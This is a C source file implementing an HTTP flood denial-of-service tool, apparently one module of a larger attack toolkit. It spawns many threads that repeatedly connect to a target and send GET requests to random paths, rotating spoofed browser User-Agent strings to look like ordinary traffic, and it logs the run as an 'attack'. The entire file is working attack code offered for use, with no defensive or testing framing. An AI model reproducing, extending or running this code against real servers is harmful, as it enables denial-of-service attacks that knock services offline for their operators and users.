#include "http_flood.h"
#include "../config.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
#pragma comment(lib, "ws2_32.lib")
#define close_socket closesocket
#define usleep_ms(ms) Sleep(ms)
#else
#include <errno.h>
#define close_socket close
#define usleep_ms(ms) usleep((ms) * 1000)
#define SOCKET int
#define INVALID_SOCKET (-1)
#define SOCKET_ERROR   (-1)
#endif

static const char *USER_AGENTS[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
};
#define NUM_USER_AGENTS 5

static double get_time(void)
{
#ifdef _WIN32
    LARGE_INTEGER freq, counter;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&counter);
    return (double)counter.QuadPart / (double)freq.QuadPart;
#else
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec + ts.tv_nsec / 1e9;
#endif
}

static void http_flood_log(http_flood_t *ctx, const char *message)
{
    if (ctx->callback) {
        ctx->callback(message);
    } else {
        printf("[HTTP Flood] %s\n", message);
    }
}

int http_flood_init(http_flood_t *ctx, const char *target, int duration,
                    int threads, int port, http_flood_callback_t callback)
{
    memset(ctx, 0, sizeof(*ctx));
    ctx->duration = duration;
    ctx->threads  = threads;
    ctx->port     = port;
    ctx->callback = callback;
    ctx->stop_flag = 0;
    pthread_mutex_init(&ctx->stats.lock, NULL);

    /* Ensure proper URL format and extract host */
    if (strncmp(target, "http://", 7) == 0) {
        snprintf(ctx->target, sizeof(ctx->target), "%s", target);
        snprintf(ctx->host, sizeof(ctx->host), "%s", target + 7);
    } else if (strncmp(target, "https://", 8) == 0) {
        snprintf(ctx->target, sizeof(ctx->target), "%s", target);
        snprintf(ctx->host, sizeof(ctx->host), "%s", target + 8);
    } else {
        snprintf(ctx->target, sizeof(ctx->target), "http://%s", target);
        snprintf(ctx->host, sizeof(ctx->host), "%s", target);
    }

    /* Strip trailing slash or path from host */
    {
        char *slash = strchr(ctx->host, '/');
        if (slash) *slash = '\0';
        char *colon = strchr(ctx->host, ':');
        if (colon) *colon = '\0';
    }

    /* Resolve hostname */
    {
        struct addrinfo hints, *res;
        memset(&hints, 0, sizeof(hints));
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;
        if (getaddrinfo(ctx->host, NULL, &hints, &res) != 0) {
            snprintf(ctx->resolved_ip, sizeof(ctx->resolved_ip), "%s", ctx->host);
        } else {
            struct sockaddr_in *addr = (struct sockaddr_in *)res->ai_addr;
            inet_ntop(AF_INET, &addr->sin_addr, ctx->resolved_ip, sizeof(ctx->resolved_ip));
            freeaddrinfo(res);
        }
    }

    return 0;
}

static void *http_flood_worker(void *arg)
{
    http_flood_t *ctx = (http_flood_t *)arg;
    char request[2048];
    char response[4096];

    while (!ctx->stop_flag) {
        SOCKET sock;
        struct sockaddr_in server;
        int path_num = rand() % 999000 + 1000;
        const char *ua = USER_AGENTS[rand() % NUM_USER_AGENTS];

        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) {
            pthread_mutex_lock(&ctx->stats.lock);
            ctx->stats.failed_requests++;
            pthread_mutex_unlock(&ctx->stats.lock);
            continue;
        }

        /* Set a timeout on the socket */
#ifdef _WIN32
        DWORD timeout_val = 5000;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char *)&timeout_val, sizeof(timeout_val));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char *)&timeout_val, sizeof(timeout_val));
#else
        struct timeval tv;
        tv.tv_sec = 5;
        tv.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
#endif

        memset(&server, 0, sizeof(server));
        server.sin_family = AF_INET;
        server.sin_port = htons(ctx->port);
        inet_pton(AF_INET, ctx->resolved_ip, &server.sin_addr);

        if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
            close_socket(sock);
            pthread_mutex_lock(&ctx->stats.lock);
            ctx->stats.failed_requests++;
            pthread_mutex_unlock(&ctx->stats.lock);
            usleep_ms(1);
            continue;
        }

        snprintf(request, sizeof(request),
                 "GET /%d HTTP/1.1\r\n"
                 "Host: %s\r\n"
                 "User-Agent: %s\r\n"
                 "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                 "Accept-Language: en-US,en;q=0.5\r\n"
                 "Accept-Encoding: gzip, deflate\r\n"
                 "Connection: keep-alive\r\n"
                 "\r\n",
                 path_num, ctx->host, ua);

        if (send(sock, request, (int)strlen(request), 0) == SOCKET_ERROR) {
            close_socket(sock);
            pthread_mutex_lock(&ctx->stats.lock);
            ctx->stats.failed_requests++;
            pthread_mutex_unlock(&ctx->stats.lock);
            continue;
        }

        /* Read at least some response (non-blocking-ish with timeout) */
        recv(sock, response, sizeof(response) - 1, 0);

        close_socket(sock);

        pthread_mutex_lock(&ctx->stats.lock);
        ctx->stats.requests_sent++;
        pthread_mutex_unlock(&ctx->stats.lock);

        usleep_ms(1); /* Small delay to prevent complete CPU saturation */
    }

    return NULL;
}

static void *http_flood_reporter(void *arg)
{
    http_flood_t *ctx = (http_flood_t *)arg;
    char msg[256];

    while (!ctx->stop_flag) {
        usleep_ms(50);
        if (!ctx->stop_flag) {
            pthread_mutex_lock(&ctx->stats.lock);
            snprintf(msg, sizeof(msg),
                     "Requests sent: %lld | Failed: %lld",
                     ctx->stats.requests_sent, ctx->stats.failed_requests);
            pthread_mutex_unlock(&ctx->stats.lock);
            http_flood_log(ctx, msg);
        }
    }

    return NULL;
}

http_flood_stats_t http_flood_run(http_flood_t *ctx)
{
    char msg[512];
    pthread_t *workers;
    pthread_t reporter;
    int i;

    ctx->stats.start_time = get_time();
    ctx->stop_flag = 0;

    snprintf(msg, sizeof(msg), "Starting HTTP Flood attack on %s", ctx->target);
    http_flood_log(ctx, msg);
    snprintf(msg, sizeof(msg), "Duration: %ds | Threads: %d", ctx->duration, ctx->threads);
    http_flood_log(ctx, msg);

    workers = (pthread_t *)malloc(sizeof(pthread_t) * ctx->threads);
    if (!workers) {
        http_flood_log(ctx, "Error: Failed to allocate thread array");
        return ctx->stats;
    }

    /* Start reporter thread */
    pthread_create(&reporter, NULL, http_flood_reporter, ctx);

    /* Start worker threads */
    for (i = 0; i < ctx->threads; i++) {
        pthread_create(&workers[i], NULL, http_flood_worker, ctx);
    }

    /* Run for specified duration */
    {
        double end_time = get_time() + ctx->duration;
        while (get_time() < end_time && !ctx->stop_flag) {
            usleep_ms(100);
        }
    }

    ctx->stop_flag = 1;

    /* Wait for threads to finish */
    for (i = 0; i < ctx->threads; i++) {
        pthread_join(workers[i], NULL);
    }
    pthread_join(reporter, NULL);

    free(workers);

    ctx->stats.end_time = get_time();

    snprintf(msg, sizeof(msg), "Attack completed. Total requests: %lld",
             ctx->stats.requests_sent);
    http_flood_log(ctx, msg);

    return ctx->stats;
}

void http_flood_stop(http_flood_t *ctx)
{
    ctx->stop_flag = 1;
    http_flood_log(ctx, "Stop signal received");
}

void http_flood_destroy(http_flood_t *ctx)
{
    pthread_mutex_destroy(&ctx->stats.lock);
}
